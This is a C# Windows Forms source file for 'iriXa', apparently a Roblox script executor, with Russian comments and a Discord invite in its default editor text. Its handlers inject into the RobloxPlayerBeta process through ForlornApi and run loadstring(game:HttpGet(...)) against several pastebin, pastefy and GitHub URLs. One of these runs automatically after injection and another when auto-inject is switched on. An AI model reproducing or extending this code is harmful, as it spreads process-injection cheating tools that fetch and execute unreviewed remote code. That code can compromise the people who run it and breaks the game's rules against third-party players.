using System.Runtime.InteropServices; // Для работы с Windows API
using System.Diagnostics; // Для работы с процессами
using System.Windows.Forms; // Для MessageBox
using System.Net;
using System;
using System.Drawing;

using System;
using System.Drawing;
using System.Runtime.InteropServices; // Для работы с Windows API
using System.Windows.Forms;
using Microsoft.Web.WebView2.WinForms; // Для WebView2

using AcrylicUI.Forms;
using AcrylicUI.Resources;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing.Drawing2D;

using System.Drawing;
using System.Drawing.Drawing2D;
using System.Linq;
using System.Windows.Forms;

namespace iriXa
{
    public partial class iriXa : AcrylicForm
    {
        [DllImport("user32.dll", EntryPoint = "ReleaseCapture")]
        private extern static void ReleaseCapture();
        [DllImport("user32.dll", EntryPoint = "SendMessage")]
        private extern static void SendMessage(IntPtr hWnd, int wMsg, int wParam, int lParam);

        private int tabCount = 1; // Текущее количество вкладок
        private const int MaxTabs = 7; // Максимальное количество вкладок

        public iriXa()
        {
            InitializeComponent();
            this.Text = "";
            this.IsAcrylic = true;
            this.BlurColor = Colors.GreyBackground;
            this.AutoScaleMode = AutoScaleMode.Dpi;


            // Применяем закругление углов
            this.SetRoundedCorners(100); // Радиус углов

            // Настройка TabControl
            tabControl1.DrawMode = TabDrawMode.OwnerDrawFixed; // Включаем пользовательскую отрисовку
            tabControl1.DrawItem += TabControl1_DrawItem; // Подключаем событие для отрисовки
            tabControl1.BackColor = Color.Black; // Цвет заднего фона вкладок
            tabControl1.ForeColor = Color.White; // Цвет текста

            // Добавляем первую вкладку
            AddNewTab("Script1");
        }

        private void SetRoundedCorners(int radius)
        {
            // Создаем путь для закругленных углов
            GraphicsPath path = new GraphicsPath();
            path.AddArc(0, 0, radius, radius, 180, 90);
            path.AddArc(this.Width - radius, 0, radius, radius, 270, 90);
            path.AddArc(this.Width - radius, this.Height - radius, radius, radius, 0, 90);
            path.AddArc(0, this.Height - radius, radius, radius, 90, 90);
            path.CloseAllFigures();

            // Устанавливаем регион формы
            this.Region = new Region(path);
        }

        protected override void OnResize(EventArgs e)
        {
            base.OnResize(e);

            // Перестраиваем регион при изменении размера формы
            this.SetRoundedCorners(30);
        }

        protected override void OnPaint(PaintEventArgs e)
        {
            base.OnPaint(e);

            // Настраиваем отрисовку закругленных углов и блюра
            e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;

            // Для дополнительного эффекта можно добавить рамку
            using (Pen borderPen = new Pen(Color.FromArgb(100, 0, 0, 0), 2))
            {
                e.Graphics.DrawPath(borderPen, GetRoundedPath(30));
            }
        }

        private GraphicsPath GetRoundedPath(int radius)
        {
            GraphicsPath path = new GraphicsPath();
            path.AddArc(0, 0, radius, radius, 180, 90);
            path.AddArc(this.Width - radius, 0, radius, radius, 270, 90);
            path.AddArc(this.Width - radius, this.Height - radius, radius, radius, 0, 90);
            path.AddArc(0, this.Height - radius, radius, radius, 90, 90);
            path.CloseAllFigures();
            return path;
        }


        private void button10_Click(object sender, EventArgs e)
        {
            // Добавляем новую вкладку, если еще не достигнут максимум
            if (tabCount < MaxTabs)
            {
                tabCount++;
                AddNewTab($"Script{tabCount}");

                // Скрываем кнопку, если достигли максимального количества вкладок
                if (tabCount == MaxTabs)
                {
                    button10.Visible = false;
                }
            }
        }

        private void AddNewTab(string tabName)
        {
            // Создаем новую вкладку
            TabPage newTab = new TabPage(tabName);

            // Создаем RichTextBox с нужными стилями
            RichTextBox richTextBox = new RichTextBox
            {
                Dock = DockStyle.Fill, // Заполняет всю вкладку
                BackColor = Color.Black, // Черный фон
                ForeColor = Color.White, // Белый текст
                BorderStyle = BorderStyle.None, // Убираем рамки
                Text = "print('discord.gg/kotolog')"

            };

            // Добавляем RichTextBox на вкладку
            newTab.Controls.Add(richTextBox);

            // Добавляем вкладку в TabControl
            tabControl1.TabPages.Add(newTab);
        }

        private void TabControl1_DrawItem(object sender, DrawItemEventArgs e)
        {
            TabControl tabControl = sender as TabControl;
            Graphics g = e.Graphics;

            // Цвет фона и текста вкладки
            Brush bgBrush = new SolidBrush(Color.Black);
            Brush textBrush = new SolidBrush(Color.White);

            // Закрашиваем фон вкладки
            g.FillRectangle(bgBrush, e.Bounds);

            // Получаем текст вкладки
            string tabText = tabControl.TabPages[e.Index].Text;

            // Центрируем текст на вкладке
            StringFormat stringFormat = new StringFormat
            {
                Alignment = StringAlignment.Center,
                LineAlignment = StringAlignment.Center
            };

            // Рисуем текст
            g.DrawString(tabText, e.Font, textBrush, e.Bounds, stringFormat);
        }


        private void Form1_Load(object sender, EventArgs e)
        {

        }






        private void richTextBox_TextChanged(object sender, EventArgs e)
        {

        }

        private void button3_Click(object sender, EventArgs e)
        {
            ForlornApi.Api.KillRoblox();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            // Проверка, запущен ли процесс RobloxPlayer.exe
            Process[] processes = Process.GetProcessesByName("RobloxPlayerBeta");
            if (processes.Length == 0) // Если процесс не найден
            {
                DialogResult result = MessageBox.Show(
                    "Roblox could not be found. Is this an error?",
                    "Warning",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Warning);

                if (result == DialogResult.No)
                {
                    return; // Прерываем выполнение
                }
            }

            ForlornApi.Api.Inject();
            if (ForlornApi.Api.IsInjected())
            {
                // Добавляем небольшую задержку, чтобы инжект завершился
                Task.Delay(5000).ContinueWith(t =>
                {
                    // Выполнение скрипта после задержки
                    ForlornApi.Api.ExecuteScript("loadstring(game:HttpGet(\"https://pastefy.app/iBIxkdb4/raw\"))()");
                });
            }

        }



        private void button4_Click(object sender, EventArgs e)
        {
            // Завершение программы
            Application.Exit();
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            // Проверяем, нажата ли левая кнопка мыши
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(this.Handle, 0xA1, 0x2, 0);
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            ForlornApi.Api.ExecuteScript("loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()");
        }

        private void button6_Click(object sender, EventArgs e)
        {
            ForlornApi.Api.ExecuteScript("loadstring(game:HttpGet('https://raw.githubusercontent.com/MassiveHubs/loadstring/refs/heads/main/DexXenoAndRezware'))()");
        }

        private void button7_Click(object sender, EventArgs e)
        {
            ForlornApi.Api.ExecuteScript("loadstring(game:HttpGet(\"https://pastebin.com/raw/PDdkDsgy\"))()");
        }

        private void button8_Click(object sender, EventArgs e)
        {
            ForlornApi.Api.ExecuteScript("local pastebinURL = \"https://pastebin.com/raw/SdGZaVZs\" local loadedScript = loadstring(game:HttpGet(pastebinURL))()\r\n\r\nlocal FREAKY_ID = 87134700438873 -- :tongue::tongue::tongue:\r\n\r\nloadedScript(FREAKY_ID)");
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            ForlornApi.Api.SetAutoInject(checkBox1.Checked);
            if (ForlornApi.Api.IsInjected()) // Проверяем, что инжект прошел успешно
            {
                // Выполняем скрипт, только если инжект прошел
                ForlornApi.Api.ExecuteScript("loadstring(game:HttpGet(\"https://pastefy.app/iBIxkdb4\"))()");
            }

        }

        private void trackBar1_Scroll(object sender, EventArgs e)
        {

        }


        private void button9_Click(object sender, EventArgs e)
        {

        }

        private void button11_Click(object sender, EventArgs e)
        {

        }

        private void button12_Click(object sender, EventArgs e)
        {

        }

        private void button13_Click(object sender, EventArgs e)
        {

        }

        private void button14_Click(object sender, EventArgs e)
        {

        }

        private void button15_Click(object sender, EventArgs e)
        {

        }

        private void button16_Click(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void button9_Click_1(object sender, EventArgs e)
        {

        }

        private void button17_Click(object sender, EventArgs e)
        {
            // Меняем прозрачность формы
            if (this.Opacity == 1.0)
            {
                this.Opacity = 0.5;
            }
            else
            {
                this.Opacity = 1.0;
            }
        }

        private void richTextBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        // Метод для получения RichTextBox с текущей вкладки
        private RichTextBox GetRichTextBoxFromTab(int tabIndex)
        {
            TabPage tabPage = tabControl1.TabPages[tabIndex];
            foreach (Control control in tabPage.Controls)
            {
                if (control is RichTextBox)
                {
                    return (RichTextBox)control;
                }
            }
            return null;
        }

        // Обработчик кнопки для выполнения скрипта
        private void button1_Click(object sender, EventArgs e)
        {
            int selectedTabIndex = tabControl1.SelectedIndex; // Получаем индекс выбранной вкладки
            RichTextBox richTextBox = GetRichTextBoxFromTab(selectedTabIndex); // Получаем RichTextBox из выбранной вкладки

            if (richTextBox != null)
            {
                // Выполняем скрипт из текста в RichTextBox
                ForlornApi.Api.ExecuteScript(richTextBox.Text);
            }
            else
            {
                MessageBox.Show("No textbox finded");
            }
        }


        private void button11_Click_1(object sender, EventArgs e)
        {

        }
    }
}
